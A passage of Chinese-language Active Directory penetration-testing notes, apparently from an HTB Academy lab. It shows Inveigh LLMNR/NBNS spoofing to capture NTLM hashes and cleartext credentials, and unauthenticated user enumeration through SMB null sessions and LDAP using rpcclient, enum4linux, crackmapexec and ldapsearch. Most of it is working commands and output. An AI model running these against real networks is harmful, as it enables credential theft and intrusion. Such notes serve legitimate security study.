<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="Inveigh"><a href="#Inveigh" class="headerlink" title="Inveigh"></a>Inveigh</h3><p><a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh">Inveigh </a>的工作原理与 Responder 类似，但使用 PowerShell 和 C# 编写。Inveigh 可以监听 IPv4 和 IPv6 以及其他几种协议，包括</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth</span><br></pre></td></tr></table></figure>

<p>导入 Inveigh 模块，列出 Invoke-Inveigh 参数</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\Inveigh.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; (<span class="built_in">Get-Command</span> <span class="built_in">Invoke-Inveigh</span>).Parameters</span><br></pre></td></tr></table></figure>

<p>使用 LLMNR 和 NBNS 欺骗启动 Inveigh，然后输出到控制台并写入文件。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-Inveigh</span> Y <span class="literal">-NBNS</span> Y <span class="literal">-ConsoleOutput</span> Y <span class="literal">-FileOutput</span> Y</span><br><span class="line"></span><br><span class="line">[*] Inveigh <span class="number">1.506</span> started at <span class="number">2022</span><span class="literal">-02-28T19</span>:<span class="number">26</span>:<span class="number">30</span></span><br><span class="line">[+] Elevated Privilege Mode = Enabled</span><br><span class="line">[+] Primary IP Address = <span class="number">172.16</span>.<span class="number">5.25</span></span><br><span class="line">[+] Spoofer IP Address = <span class="number">172.16</span>.<span class="number">5.25</span></span><br><span class="line">[+] ADIDNS Spoofer = Disabled</span><br><span class="line">[+] DNS Spoofer = Enabled</span><br><span class="line">[+] DNS TTL = <span class="number">30</span> Seconds</span><br><span class="line">[+] LLMNR Spoofer = Enabled</span><br><span class="line">[+] LLMNR TTL = <span class="number">30</span> Seconds</span><br><span class="line">[+] mDNS Spoofer = Disabled</span><br><span class="line">[+] NBNS Spoofer <span class="keyword">For</span> Types <span class="number">00</span>,<span class="number">20</span> = Enabled</span><br><span class="line">[+] NBNS TTL = <span class="number">165</span> Seconds</span><br><span class="line">[+] SMB Capture = Enabled</span><br><span class="line">[+] HTTP Capture = Enabled</span><br><span class="line">[+] HTTPS Certificate Issuer = Inveigh</span><br><span class="line">[+] HTTPS Certificate CN = localhost</span><br><span class="line">[+] HTTPS Capture = Enabled</span><br><span class="line">[+] HTTP/HTTPS Authentication = NTLM</span><br><span class="line">[+] WPAD Authentication = NTLM</span><br><span class="line">[+] WPAD NTLM Authentication Ignore List = Firefox</span><br><span class="line">[+] WPAD Response = Enabled</span><br><span class="line">[+] Kerberos TGT Capture = Disabled</span><br><span class="line">[+] Machine Account Capture = Disabled</span><br><span class="line">[+] Console Output = Full</span><br><span class="line">[+] File Output = Enabled</span><br><span class="line">[+] Output Directory = C:\Tools</span><br><span class="line">WARNING: [!] Run <span class="built_in">Stop-Inveigh</span> to stop</span><br><span class="line">[*] Press any key to stop console output</span><br><span class="line">WARNING: [-] [<span class="number">2022</span>-<span class="number">02</span>-<span class="number">28</span><span class="type">T19</span>:<span class="number">26</span>:<span class="number">31</span>] Error starting HTTP listener</span><br><span class="line">WARNING: [!] [<span class="number">2022</span>-<span class="number">02</span>-<span class="number">28</span><span class="type">T19</span>:<span class="number">26</span>:<span class="number">31</span>] Exception calling <span class="string">&quot;Start&quot;</span> with <span class="string">&quot;0&quot;</span> argument(s): <span class="string">&quot;An attempt was made to access a</span></span><br><span class="line"><span class="string">socket in a way forbidden by its access permissions&quot;</span> <span class="variable">$HTTP_listener</span>.Start()</span><br><span class="line"><span class="function">[+] [<span class="number">2022</span>-<span class="number">02</span>-<span class="number">28</span><span class="type">T19</span>:<span class="number">26</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM) request academy<span class="literal">-ea-web0</span>.local received from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">spoofer</span> <span class="type">disabled</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">2022</span>-<span class="number">02</span>-<span class="number">28</span><span class="type">T19</span>:<span class="number">26</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM) request academy<span class="literal">-ea-web0</span>.local received from <span class="number">172.16</span>.<span class="number">5.125</span> </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>more</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-Inveigh</span> Y <span class="literal">-NBNS</span> Y <span class="literal">-LLMNR</span> Y <span class="literal">-HTTP</span> Y <span class="literal">-HTTPS</span> Y <span class="literal">-SMB</span> Y <span class="literal">-ConsoleOutput</span> Y <span class="literal">-FileOutput</span> Y</span><br></pre></td></tr></table></figure>

<h3 id="C-Inveigh-InveighZero"><a href="#C-Inveigh-InveighZero" class="headerlink" title="C# Inveigh (InveighZero)"></a>C# Inveigh (InveighZero)</h3><p>Inveigh 的 PowerShell 版本是原始版本，不再更新。工具作者维护 C# 版本，该版本结合了原始 PoC C# 代码和 PowerShell 版本中大部分代码的 C# 端口。</p>
<p>运行 Inveigh.exe</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Inveigh.exe</span><br><span class="line"></span><br><span class="line">[*] Inveigh <span class="number">2.0</span>.<span class="number">4</span> [<span class="type">Started</span> <span class="number">2022</span>-<span class="number">02</span>-<span class="number">28</span><span class="type">T20</span>:<span class="number">03</span>:<span class="number">28</span> | <span class="type">PID</span> <span class="number">6276</span>]</span><br><span class="line">[+] Packet Sniffer Addresses [<span class="type">IP</span> <span class="number">172.16</span><span class="type">.5.25</span> | <span class="type">IPv6</span> <span class="type">fe80</span>::<span class="type">dcec</span>:<span class="number">2831</span>:<span class="number">712</span><span class="type">b</span>:<span class="type">c9a3</span>%<span class="number">8</span>]</span><br><span class="line">[+] Listener Addresses [<span class="type">IP</span> <span class="number">0.0</span><span class="type">.0.0</span> | <span class="type">IPv6</span> ::]</span><br><span class="line">[+] Spoofer Reply Addresses [<span class="type">IP</span> <span class="number">172.16</span><span class="type">.5.25</span> | <span class="type">IPv6</span> <span class="type">fe80</span>::<span class="type">dcec</span>:<span class="number">2831</span>:<span class="number">712</span><span class="type">b</span>:<span class="type">c9a3</span>%<span class="number">8</span>]</span><br><span class="line">[+] Spoofer Options [<span class="type">Repeat</span> <span class="type">Enabled</span> | <span class="type">Local</span> <span class="type">Attacks</span> <span class="type">Disabled</span>]</span><br><span class="line">[ ] DHCPv6</span><br><span class="line">[+] DNS Packet Sniffer [<span class="type">Type</span> <span class="type">A</span>]</span><br><span class="line">[ ] ICMPv6</span><br><span class="line">[+] LLMNR Packet Sniffer [<span class="type">Type</span> <span class="type">A</span>]</span><br><span class="line">[ ] MDNS</span><br><span class="line">[ ] NBNS</span><br><span class="line">[+] HTTP Listener [<span class="type">HTTPAuth</span> <span class="type">NTLM</span> | <span class="type">WPADAuth</span> <span class="type">NTLM</span> | <span class="type">Port</span> <span class="number">80</span>]</span><br><span class="line">[ ] HTTPS</span><br><span class="line">[+] WebDAV [<span class="type">WebDAVAuth</span> <span class="type">NTLM</span>]</span><br><span class="line">[ ] Proxy</span><br><span class="line">[+] LDAP Listener [<span class="type">Port</span> <span class="number">389</span>]</span><br><span class="line">[+] SMB Packet Sniffer [<span class="type">Port</span> <span class="number">445</span>]</span><br><span class="line">[+] File Output [<span class="type">C</span>:\<span class="type">Tools</span>]</span><br><span class="line">[+] Previous Session Files (Not Found)</span><br><span class="line">[*] Press ESC to enter/<span class="keyword">exit</span> interactive console</span><br><span class="line">[!] Failed to <span class="built_in">start</span> HTTP listener on port <span class="number">80</span>, check IP and port usage.</span><br><span class="line">[!] Failed to <span class="built_in">start</span> HTTPv6 listener on port <span class="number">80</span>, check IP and port usage.</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM)(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM)(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM)(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM)(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">mDNS</span></span>(QM)(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">mDNS</span></span>(QM)(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">mDNS</span></span>(QM)(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">mDNS</span></span>(QM)(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br></pre></td></tr></table></figure>

<p>带有<code>[+]</code>的选项是启用选项，默认情况下启用，而带有<code>[ ]</code>的选项是禁用的。</p>
<p>在 Inveigh 运行时按下<code>esc</code>键进入控制台</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[<span class="type">.</span>] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">TCP</span></span>(<span class="number">1433</span>) SYN packet from <span class="number">172.16</span>.<span class="number">5.125</span>:<span class="number">61310</span></span><br><span class="line"><span class="function">[<span class="type">.</span>] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">TCP</span></span>(<span class="number">1433</span>) SYN packet from <span class="number">172.16</span>.<span class="number">5.125</span>:<span class="number">61311</span></span><br></pre></td></tr></table></figure>

<p>HELP</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">C(<span class="number">0</span>:<span class="number">0</span>) NTLMv1(<span class="number">0</span>:<span class="number">0</span>) NTLMv2(<span class="number">3</span>:<span class="number">9</span>)&gt; HELP</span><br><span class="line"></span><br><span class="line">=============================================== Inveigh Console Commands ===============================================</span><br><span class="line"></span><br><span class="line">Command                           Description</span><br><span class="line">========================================================================================================================</span><br><span class="line">GET CONSOLE                     | get queued console output</span><br><span class="line">GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses</span><br><span class="line">GET LOG                         | get log entries; add search string to <span class="keyword">filter</span> results</span><br><span class="line">GET NTLMV1                      | get captured NTLMv1 hashes; add search string to <span class="keyword">filter</span> results</span><br><span class="line">GET NTLMV2                      | get captured NTLMv2 hashes; add search string to <span class="keyword">filter</span> results</span><br><span class="line">GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to <span class="keyword">filter</span> results</span><br><span class="line">GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to <span class="keyword">filter</span> results</span><br><span class="line">GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames <span class="keyword">for</span> captured NTLMv1 hashes</span><br><span class="line">GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames <span class="keyword">for</span> captured NTLMv2 hashes</span><br><span class="line">GET CLEARTEXT                   | get captured cleartext credentials</span><br><span class="line">GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials</span><br><span class="line">GET REPLYTODOMAINS              | get ReplyToDomains <span class="keyword">parameter</span> startup values</span><br><span class="line">GET REPLYTOHOSTS                | get ReplyToHosts <span class="keyword">parameter</span> startup values</span><br><span class="line">GET REPLYTOIPS                  | get ReplyToIPs <span class="keyword">parameter</span> startup values</span><br><span class="line">GET REPLYTOMACS                 | get ReplyToMACs <span class="keyword">parameter</span> startup values</span><br><span class="line">GET IGNOREDOMAINS               | get IgnoreDomains <span class="keyword">parameter</span> startup values</span><br><span class="line">GET IGNOREHOSTS                 | get IgnoreHosts <span class="keyword">parameter</span> startup values</span><br><span class="line">GET IGNOREIPS                   | get IgnoreIPs <span class="keyword">parameter</span> startup values</span><br><span class="line">GET IGNOREMACS                  | get IgnoreMACs <span class="keyword">parameter</span> startup values</span><br><span class="line"><span class="built_in">SET</span> CONSOLE                     | <span class="built_in">set</span> Console <span class="keyword">parameter</span> value</span><br><span class="line"><span class="built_in">HISTORY</span>                         | get command <span class="built_in">history</span></span><br><span class="line">RESUME                          | resume real time console output</span><br><span class="line">STOP                            | stop Inveigh</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h1><p>Skip 分析密码策略</p>
<p>如果您在内部计算机上但没有有效的域凭据，则可以在域控制器上查找 SMB NULL 会话或 LDAP 匿名绑定。这两种方法都可以让您获得 Active Directory 中所有用户的准确列表和密码策略</p>
<blockquote>
<p>如果无法使用以下的任何方法创建有效的用户名列表，可以从外部信息收集并搜索公司电子邮件地址或使用<a target="_blank" rel="noopener" href="https://github.com/initstring/linkedin2username">linkedin2username</a>等工具从公司的 LinkedIn 页面中混合可能的用户名。</p>
</blockquote>
<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>SMB NULL Session 允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机、用户帐户属性和域密码策略的完整列表。</p>
<p>TCP 445: 现代 SMB（如 SMBv2 和 SMBv3）的主要端口，用于直接通过 TCP&#x2F;IP 进行通信，无需 NetBIOS 支持。</p>
<p>TCP&#x2F;UDP 137-139: 基于 NetBIOS 的旧式 SMB 通信端口，主要用于 SMBv1：</p>
<ul>
<li>UDP 137: NetBIOS 名称服务，用于名称解析</li>
<li>UDP 138: NetBIOS 数据报服务，用于浏览网络信息</li>
<li>TCP 139: NetBIOS 会话服务，用于实际数据传输</li>
</ul>
<h3 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ rpcclient -U &quot;&quot; -N 172.16.5.5</span><br><span class="line"># -U uname%passwd</span><br><span class="line"></span><br><span class="line">rpcclient $&gt; enumdomusers </span><br><span class="line">user:[administrator] rid:[0x1f4]</span><br><span class="line">user:[guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[lab_adm] rid:[0x3e9]</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ enum4linux -U 172.16.5.5  | grep &quot;user:&quot; | cut -f2 -d&quot;[&quot; | cut -f1 -d&quot;]&quot;</span><br><span class="line"># [-U uname [-P passwd ｜-H NTLM_hash]]</span><br><span class="line"></span><br><span class="line">administrator</span><br><span class="line">guest</span><br><span class="line">krbtgt</span><br><span class="line">lab_adm</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="enum4linux-ng"><a href="#enum4linux-ng" class="headerlink" title="enum4linux-ng"></a>enum4linux-ng</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ enum4linux-ng -U 172.16.5.5 | grep &quot;username:&quot; | cut -d &#x27;:&#x27; -f2 | tr -d &#x27; &#x27;</span><br><span class="line"># [-U uname [-P passwd ｜-H NTLM_hash]]</span><br></pre></td></tr></table></figure>

<h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 172.16.5.5 --users</span><br><span class="line"># [-u uname -p passwd]</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>LDAP（轻量级目录访问协议，Lightweight Directory Access Protocol） 是一种用于访问和管理目录服务的协议。</p>
<p>TCP 389: 标准的未加密 LDAP 通信端口</p>
<p>TCP 636: 用于加密通信（LDAPS，LDAP over SSL&#x2F;TLS）的端口</p>
<h3 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=user))&quot;  | grep sAMAccountName: | cut -f2 -d&quot; &quot;</span><br><span class="line"># [-D &quot;uname@INLANEFREIGHT.LOCAL&quot; -W &quot;uname&quot;]</span><br><span class="line"></span><br><span class="line">guest</span><br><span class="line">ACADEMY-EA-DC01$</span><br><span class="line">ACADEMY-EA-MS01$</span><br><span class="line">ACADEMY-EA-WEB01$</span><br><span class="line">htb-student</span><br><span class="line">avazquez</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="windapsearch"><a href="#windapsearch" class="headerlink" title="windapsearch"></a>windapsearch</h3><p><a target="_blank" rel="noopener" href="https://github.com/ropnop/windapsearch">Windapsearch</a>是一个方便的 Python 脚本，我们可以使用它通过 LDAP 查询从 Windows 域中枚举用户、组和计算机。</p>
